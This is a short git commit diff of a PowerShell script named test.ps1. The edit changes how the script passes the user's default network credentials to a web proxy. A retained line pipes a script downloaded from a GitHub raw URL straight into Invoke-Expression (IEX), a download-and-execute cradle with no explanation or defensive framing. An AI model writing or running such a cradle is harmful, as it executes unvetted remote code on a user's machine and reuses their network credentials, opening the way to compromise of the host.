a38c5ecfa59268f256a6bf09175e41fc6064ff2e
evilmog <evilmog@evilmogs-MacBook-Pro.local>
2017-11-27 12:31:37 -0700

    update

--- test.ps1
+++ test.ps1
@@ -1,4 +1,5 @@
-[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
-[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+$proxy = New-Object System.Net.WebClient
+
+$Proxy.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
 IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/evilmog/evilmog/master/powershell.ps1")
